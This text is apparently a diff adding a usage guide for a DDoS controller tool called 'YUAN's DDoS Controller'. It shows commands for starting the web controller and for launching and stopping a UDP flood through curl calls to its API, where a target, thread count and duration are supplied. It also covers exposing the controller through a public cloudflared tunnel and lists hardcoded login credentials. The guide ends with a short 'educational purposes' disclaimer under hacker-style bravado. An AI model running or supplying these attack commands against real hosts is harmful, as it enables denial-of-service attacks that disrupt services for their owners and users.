@@ -1,0 +1,164 @@
+╔═══════════════════════════════════════════════════════════════════╗
+║              YUAN's DDoS CONTROLLER - COMMAND GUIDE              ║
+║                    BLACKARCH LINUX STYLE                         ║
+║              YUAN WAS HERE - NO SYSTEM IS SAFE                   ║
+╚═══════════════════════════════════════════════════════════════════╝
+
+                    👁️  THE EYE SEES ALL  👁️
+
+
+┌───────────────────────────────────────────────────────────────────┐
+│                     BASIC COMMANDS                                │
+└───────────────────────────────────────────────────────────────────┘
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ python yuan_web_controller.py
+    [✓] Start server on default port 8080
+    [✓] Access: http://localhost:8080
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ python yuan_web_controller.py --port 9090
+    [✓] Start server on custom port 9090
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ python yuan_web_controller.py -p 8080
+    [✓] Short form for port specification
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ python yuan_web_controller.py --help
+    [✓] Show this help message
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ python yuan_web_controller.py --version
+    [✓] Show version information
+
+
+┌───────────────────────────────────────────────────────────────────┐
+│                     NETWORK INFORMATION                           │
+└───────────────────────────────────────────────────────────────────┘
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ python yuan_web_controller.py
+    [✓] Automatically displays:
+        • Local URL:  http://localhost:8080
+        • Network URL: http://192.168.1.x:8080
+        • Public IP:   Your public IP (if available)
+        • API Endpoint: http://192.168.1.x:8080/api
+
+
+┌───────────────────────────────────────────────────────────────────┐
+│                     API ENDPOINTS (via curl)                      │
+└───────────────────────────────────────────────────────────────────┘
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ curl http://localhost:8080/api/status
+    {
+      "running": false,
+      "status": "idle",
+      "packets": 0,
+      "yuan_message": "YUAN WON"
+    }
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ curl http://localhost:8080/api/network
+    {
+      "local_ip": "192.168.1.100",
+      "port": 8080,
+      "public_ip": "210.23.162.152",
+      "local_url": "http://192.168.1.100:8080"
+    }
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ curl -X POST http://localhost:8080/api/login \
+         -H "Content-Type: application/json" \
+         -d '{"username":"yuan","password":"yuan"}'
+    {"success": true, "message": "Login successful"}
+
+
+┌───────────────────────────────────────────────────────────────────┐
+│                     ATTACK COMMANDS (via curl)                    │
+└───────────────────────────────────────────────────────────────────┘
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ curl -X POST http://localhost:8080/api/start \
+         -H "Content-Type: application/json" \
+         -d '{
+           "target": "192.168.1.1:80",
+           "method": "UDP",
+           "threads": 100,
+           "seconds": 30
+         }'
+    {"success": true, "message": "Attack started"}
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ curl -X POST http://localhost:8080/api/stop
+    {"success": true, "message": "Attack stopped"}
+
+
+┌───────────────────────────────────────────────────────────────────┐
+│                     CLOUDFLARED TUNNEL                            │
+└───────────────────────────────────────────────────────────────────┘
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ cloudflared tunnel --url http://localhost:8080
+    [✓] Creates public HTTPS URL
+    [✓] Output: https://random-name.trycloudflare.com
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ cloudflared tunnel --url http://192.168.1.100:8080
+    [✓] Tunnel using network IP
+
+
+┌───────────────────────────────────────────────────────────────────┐
+│                     TROUBLESHOOTING                               │
+└───────────────────────────────────────────────────────────────────┘
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ python yuan_web_controller.py --port 9090
+    [✓] If port 8080 is in use, try a different port
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ netstat -tulpn | grep 8080
+    [✓] Check what's using port 8080
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ lsof -i :8080
+    [✓] Alternative way to check port usage
+
+┌─[root@blackarch]─[~/YUAN-DDoS]
+└──╼ $ kill -9 $(lsof -t -i:8080)
+    [✓] Kill process using port 8080
+
+
+┌───────────────────────────────────────────────────────────────────┐
+│                     QUICK REFERENCE CARD                          │
+└───────────────────────────────────────────────────────────────────┘
+
+┌─────────────┬─────────────────────────────────┬─────────────────────┐
+│   Action    │        Command                   │     Description     │
+├─────────────┼─────────────────────────────────┼─────────────────────┤
+│ Start       │ python yuan_web_controller.py    │ Default port 8080   │
+│ Custom Port │ python yuan_web_controller.py -p 9090 │ Port 9090      │
+│ Help        │ python yuan_web_controller.py --help │ Show help       │
+│ Version     │ python yuan_web_controller.py --version │ Show version │
+│ Local URL   │ http://localhost:PORT             │ Access locally      │
+│ Network URL │ http://YOUR-IP:PORT               │ Access from network │
+│ Cloudflare  │ cloudflared tunnel --url ...      │ Public HTTPS URL   │
+│ API Status  │ curl http://localhost:PORT/api/status │ Check status   │
+│ Stop Server │ Ctrl+C                            │ Stop the server    │
+└─────────────┴─────────────────────────────────┴─────────────────────┘
+
+
+┌───────────────────────────────────────────────────────────────────┐
+│                     DISCLAIMER                                    │
+└───────────────────────────────────────────────────────────────────┘
+
+This tool is for EDUCATIONAL PURPOSES ONLY.
+Unauthorized DDoS attacks are ILLEGAL and can result in:
+  • 5-10 years imprisonment
+  • $500,000+ fines
+  • Criminal record
+
+Only use on systems you OWN or have WRITTEN PERMISSION to test.
+
+              YUAN WAS HERE - NO SYSTEM IS SAFE
